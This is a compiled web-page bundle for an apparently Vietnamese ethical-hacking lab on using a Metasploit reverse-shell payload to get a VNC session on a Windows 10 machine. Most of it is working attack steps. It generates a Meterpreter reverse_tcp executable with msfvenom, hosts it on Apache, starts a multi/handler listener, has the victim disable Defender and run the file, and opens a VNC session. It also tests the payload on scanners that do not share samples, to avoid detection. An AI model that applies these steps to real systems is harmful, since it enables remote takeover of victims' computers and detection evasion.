import{_ as t,c as a,a1 as n,o as c}from"./chunks/framework.BDxlaA_J.js";const d=JSON.parse('{"title":"Khai thác Lỗ hổng Phía Client và Thiết lập Phiên VNC","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/5-system-hacking/4-VNC-Session.md","filePath":"vi/categories/ethical-hacking-labs/5-system-hacking/4-VNC-Session.md"}'),i={name:"vi/categories/ethical-hacking-labs/5-system-hacking/4-VNC-Session.md"};function h(r,e,s,o,p,l){return c(),a("div",null,e[0]||(e[0]=[n(`<h1 id="khai-thac-lo-hong-phia-client-va-thiet-lap-phien-vnc" tabindex="-1">Khai thác Lỗ hổng Phía Client và Thiết lập Phiên VNC <a class="header-anchor" href="#khai-thac-lo-hong-phia-client-va-thiet-lap-phien-vnc" aria-label="Permalink to &quot;Khai thác Lỗ hổng Phía Client và Thiết lập Phiên VNC&quot;">​</a></h1><p>Kẻ tấn công sử dụng lỗ hổng phía client để khai thác phần mềm chưa được vá, từ đó đạt được quyền truy cập vào máy tính trên đó phần mềm được cài đặt.</p><p>VNC cho phép kẻ tấn công truy cập và điều khiển từ xa các máy tính được nhắm mục tiêu từ máy tính hoặc thiết bị di động khác, bất kể họ ở đâu trên thế giới. Đồng thời, nó cũng được sử dụng bởi quản trị viên và các tổ chức trong mọi lĩnh vực ngành cho nhiều kịch bản và trường hợp sử dụng khác nhau, bao gồm cung cấp hỗ trợ máy tính để bàn IT cho đồng nghiệp và bạn bè, cũng như truy cập các hệ thống và dịch vụ khi di chuyển.</p><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Cách khai thác lỗ hổng phía client và thiết lập phiên VNC.</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Kali Linux (Kẻ tấn công).</li><li>Máy ảo Windows 10 (Mục tiêu).</li></ul><h2 id="khoi-chay-metasploit-framework" tabindex="-1">Khởi chạy Metasploit Framework <a class="header-anchor" href="#khoi-chay-metasploit-framework" aria-label="Permalink to &quot;Khởi chạy Metasploit Framework&quot;">​</a></h2><p>Khởi chạy Kali Linux và mở cửa sổ Terminal và nhập:</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.2.42 LPORT=444 -o /root/Desktop/Test.exe</code></p><p><strong>Lưu ý</strong>: LHOST là địa chỉ IP của máy Kali của bạn.</p><p>Lệnh này sẽ tạo Test.exe, một file độc hại trên Desktop như hình dưới đây:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>No encoder or badchars specified, outputting raw payload</span></span>
<span class="line"><span>Payload size: 341 bytes</span></span>
<span class="line"><span>Final size of exe file: 73802 bytes</span></span>
<span class="line"><span>Saved as: /root/Desktop/Test.exe</span></span></code></pre></div><p>Bạn cũng có thể thử cách này bằng cách sử dụng <code>msfconsole</code>.</p><p>Để kiểm tra file độc hại bạn đã tạo, truy cập <a href="https://nodistribute.com/" target="_blank" rel="noreferrer">https://nodistribute.com/</a> hoặc <a href="https://antiscan.me" target="_blank" rel="noreferrer">https://antiscan.me</a> và tải file lên:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0e16bfcaba630b14ba1efa3ca24e061158247558/antiscan.png" alt="AntiScan.Me"></p><p>Trang web này sẽ quét qua hơn 20 cơ sở dữ liệu phần mềm diệt virus. <strong>KHÔNG tải lên backdoor hoặc bất kỳ file nào lên VirusTotal.</strong></p><h2 id="chia-se-file-đoc-hai-voi-muc-tieu" tabindex="-1">Chia sẻ file độc hại với mục tiêu <a class="header-anchor" href="#chia-se-file-đoc-hai-voi-muc-tieu" aria-label="Permalink to &quot;Chia sẻ file độc hại với mục tiêu&quot;">​</a></h2><p>Bây giờ tạo một thư mục để chia sẻ file này với máy mục tiêu, cấp quyền và sao chép file từ Desktop vào vị trí chia sẻ:</p><p>Tạo thư mục trong thư mục html: <code>mkdir /var/www/html/share/</code></p><p>Thay đổi quyền cho thư mục chia sẻ thành <strong>755</strong>: <code>chmod -R 755 /var/www/html/share/</code></p><p>Thay đổi quyền sở hữu của thư mục đó thành <strong>www-data</strong>: <code>chown -R www-data:www-data /var/www/html/share/</code></p><p>Bây giờ sao chép file độc hại vào vị trí chia sẻ: <code>cp /root/Desktop/Test.exe /var/www/html/share/</code></p><p>Tiếp theo, khởi động dịch vụ apache: <code>service apache2 start</code></p><p>Mở một cửa sổ terminal mới và nhập <code>msfconsole</code> để khởi chạy Metasploit Framework.</p><p>Sử dụng <code>multi/handler</code> để bắt phiên.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3f818aa7902d7d0c864577c885b2a16c1b5caa33/msfconsole.png" alt="msfconsole"></p><p>Trong msfconsole:</p><ol><li><code>use multi/handler</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li>Đặt <code>LHOST</code> thành địa chỉ IP Kali của bạn và <code>LPORT</code> thành 444</li><li><code>run</code> khai thác</li></ol><h4 id="reverse-tcp" tabindex="-1">Reverse TCP <a class="header-anchor" href="#reverse-tcp" aria-label="Permalink to &quot;Reverse TCP&quot;">​</a></h4><p>Reverse shell (còn gọi là connect-back) là hoàn toàn ngược lại: nó yêu cầu kẻ tấn công thiết lập một listener trước trên máy của mình, máy mục tiêu hoạt động như một client kết nối đến listener đó, và sau đó kẻ tấn công nhận được shell.</p><p>Module này khai thác lỗ hổng hỏng bộ nhớ trong công cụ HTML của Microsoft (mshtml). Khi phân tích trang HTML chứa import CSS đệ quy, một đối tượng C++ bị xóa và sau đó được sử dụng lại.</p><h2 id="tren-may-windows" tabindex="-1">Trên máy Windows <a class="header-anchor" href="#tren-may-windows" aria-label="Permalink to &quot;Trên máy Windows&quot;">​</a></h2><p>Hãy nhớ vô hiệu hóa tất cả các thông số Windows Defender.</p><p>Khởi chạy trình duyệt và nhập địa chỉ IP của máy Kali đang chạy apache webserver và tải xuống <strong>Test.exe</strong>.</p><p>Trong trường hợp của tôi là <code>http://10.0.2.42/share</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/48fe2ec77ebde90c0febb208704e4172b60b4428/testexe.png" alt="Test.Exe"></p><p>Nhấp đúp vào <strong>Test.exe</strong>. Bạn sẽ thấy cửa sổ Security Warning, nhấp vào <strong>run</strong>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png" alt="Sec Warning"></p><h2 id="meterpreter" tabindex="-1">Meterpreter <a class="header-anchor" href="#meterpreter" aria-label="Permalink to &quot;Meterpreter&quot;">​</a></h2><p>Chuyển sang máy Kali Linux và kiểm tra xem có phiên nào đang mở trong Meterpreter Shell như hình dưới đây:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/meterpreter.png" alt="meterpreter"></p><p>Meterpreter là một payload tấn công của Metasploit cung cấp một shell tương tác từ đó kẻ tấn công có thể khám phá máy mục tiêu và thực thi mã.</p><p>Các lệnh hữu ích: <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" target="_blank" rel="noreferrer">https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/</a></p><p>Về Meterpreter: <a href="https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/" target="_blank" rel="noreferrer">https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/</a></p><h2 id="xem-tu-xa-trong-kali-linux" tabindex="-1">Xem từ xa trong Kali Linux <a class="header-anchor" href="#xem-tu-xa-trong-kali-linux" aria-label="Permalink to &quot;Xem từ xa trong Kali Linux&quot;">​</a></h2><p>Bây giờ, bạn có thể tạo một phiên VNC trên máy Windows 10 từ xa bằng cách nhập:</p><p><code>run vnc</code></p><p>Lệnh này sẽ mở một phiên VNC của máy mục tiêu như hình dưới đây:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/78278f30571b9988b108c92defcd91134886c404/vnc.png" alt="vnc"></p><p>Liên kết hữu ích:</p><ul><li><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf" target="_blank" rel="noreferrer">Metasploit Cheat Sheet - SANS</a></li><li><a href="https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf" target="_blank" rel="noreferrer">Meterpreter Cheat Sheet</a></li><li><a href="https://widesecurity.net/linux/msfvenom-cheat-sheet/" target="_blank" rel="noreferrer">Msfvenom Cheat Sheet</a></li></ul>`,52)]))}const u=t(i,[["render",h]]);export{d as __pageData,u as default};
